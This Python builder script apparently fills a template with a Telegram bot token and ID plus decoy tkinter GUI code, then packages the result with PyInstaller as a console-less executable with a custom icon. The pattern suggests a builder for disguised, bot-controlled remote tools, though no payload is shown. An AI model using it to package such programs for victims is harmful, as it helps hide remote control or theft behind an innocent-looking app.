from colorama import init, Fore, Style
from os import system
init()
def make_python(ID, TOKEN, NAME, CODE_ADDR, OFFLINE_CODE_ADDR):
    with open("builder/build.py", "r") as read: 
        text = read.readlines()
        with open(CODE_ADDR, "r") as read:
            reader = read.readlines()
            reader = "".join(reader)
            reader = reader.split("\n")
            tkinter_code = """"""
            for i in reader:
                tkinter_code += f"    {i}\n"
        with open(OFFLINE_CODE_ADDR, "r") as read:
            reader = read.readlines()
            reader = "".join(reader)
            reader = reader.split("\n")
            offline_tkinter_code = """"""
            for i in reader:
                offline_tkinter_code += f"    {i}\n"
        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("TK_CODE", tkinter_code).replace("OFFLINE_TKINTER_CODE", offline_tkinter_code)
    system("mkdir output")
    with open(f"output/{NAME}.py", "w") as write:
        write.write(text)
    print(Fore.GREEN + "File is created in /output directory.")
def make_exe(NAME, ICON): 
    system("mkdir output/exe")
    system(f"pyinstaller --name {NAME} --onefile -i {ICON} --noconsole --distpath output/exe output/{NAME}.py")
    print(Fore.GREEN + f".exe application is created in /output/exe/{NAME}.exe")
